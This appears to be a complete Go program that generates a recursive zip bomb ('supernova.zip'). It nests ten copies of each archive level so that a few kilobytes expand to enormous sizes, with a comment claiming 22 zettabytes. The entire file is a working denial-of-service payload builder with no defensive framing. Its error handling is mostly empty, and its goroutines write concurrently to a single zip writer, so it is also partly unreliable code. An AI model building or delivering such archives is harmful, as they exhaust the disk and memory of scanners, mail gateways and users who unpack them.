	package main

	// ./<bin> <amount of layers>

	// supernova with 22 Zettabytes
	// ./<bin> 18

	import (
		"archive/zip"
		"math/big"
		"io"
		"fmt"
		"os"
		"strconv"
		"io/ioutil"
		"strings"
		"time"
		"sync"
	)


	const outfile = "supernova.zip"

	func ZipFiles(filename string, file string) error {
		newZipFile, err := os.Create(filename)
		if err != nil {}
		defer newZipFile.Close()

		zipWriter := zip.NewWriter(newZipFile)
		defer zipWriter.Close()

		err = AddFileToZip(zipWriter, file)
		os.Remove(file)
		return err
	}

	func AddFileToZip(zipWriter *zip.Writer, filename string) error {
		fileToZip, err := os.Open(filename)
		if err != nil {}
		defer fileToZip.Close()

		info, err := fileToZip.Stat()
		if err != nil {}

		header, err := zip.FileInfoHeader(info)
		if err != nil {}

		header.Name = filename

		header.Method = zip.Deflate
		writer, err := zipWriter.CreateHeader(header)
		if err != nil {
			return err
		}
		_, err = io.Copy(writer, fileToZip)
		if err != nil {
			return err
		}
		return nil
	}

	func CopyAndCompress(file string, count int) error {
		// Create next level zip archive
		newZipName := fmt.Sprintf("level%d.zip", count+1)
		newZipFile, err := os.Create(newZipName)
		if err != nil {}
		defer newZipFile.Close()
		zipWriter := zip.NewWriter(newZipFile)
		defer zipWriter.Close()

		// Add ten copies of the previous level zip archive
		bytesRead, err := ioutil.ReadFile(file)
		if err != nil {}

		var wg sync.WaitGroup // Add a WaitGroup to wait for goroutines to finish
		for i := 1; i <= 10; i++ {
			wg.Add(1) // Increment the WaitGroup counter
			go func(i int) {
				defer wg.Done() // Decrement the counter when the goroutine completes
				zipName := fmt.Sprintf("%d.zip", i)
				err = ioutil.WriteFile(zipName, bytesRead, 0755)
				if err != nil {
					fmt.Println("Error writing file:", err)
					return
				}
				err = AddFileToZip(zipWriter, zipName)
				if err != nil {
					fmt.Println("Error adding file to zip:", err)
					return
				}
				os.Remove(zipName)
			}(i)
		}
		wg.Wait() // Wait for all goroutines to finish
		os.Remove(file)
		return nil
	}



	func GenerateNest(levels int) {
		start := time.Now()

		// Create a dummy file of size 1MB
		dummyFile := "dummy.txt"
		file, err := os.Create(dummyFile)
		if err != nil {}

		x := strings.Repeat("0", 1024*1024)
		_, err = file.Write([]byte(x))
		if err != nil {}
		file.Close()

		// Make level1 zip archive using the dummy file
		level1 := "level1.zip"
		err = ZipFiles(level1, dummyFile)
		if err != nil {}

		decompressionSize := big.NewInt(24214 * 10) // Initialize based on the size of 10 zip files
		for i := 1; i < levels; i++ {
			decompressionSize.Mul(decompressionSize, big.NewInt(10)) // Use Mul method for big.Int
			zipName := fmt.Sprintf("level%d.zip", i)
			err = CopyAndCompress(zipName, i)
			if err != nil {}
		}
		decompressionSize = new(big.Int).Div(decompressionSize, big.NewInt(1024*1024)) // Convert to MB

		// Rename the last level zip archive
		bombLevel := fmt.Sprintf("level%d.zip", levels)
		bytesRead, err := ioutil.ReadFile(bombLevel)
		if err != nil {}
		err = ioutil.WriteFile(outfile, bytesRead, 0755)
		if err != nil {}
		os.Remove(bombLevel)
		os.Remove(dummyFile)

		end := time.Now()
		elapsed := end.Sub(start)

		bombInfo, err := os.Stat(outfile)
		if err != nil {}
		bombSize := bombInfo.Size()
		fmt.Println("disk filesize: supernova.zip", bombSize/1024, "KB")
		fmt.Println("decompressed filesize", decompressionSize, "MB")
		fmt.Println("time elapsed:", elapsed, "ms")
	}

	func main() {
		levels, err := strconv.Atoi(os.Args[1])
		if err != nil {}
		GenerateNest(levels)
	}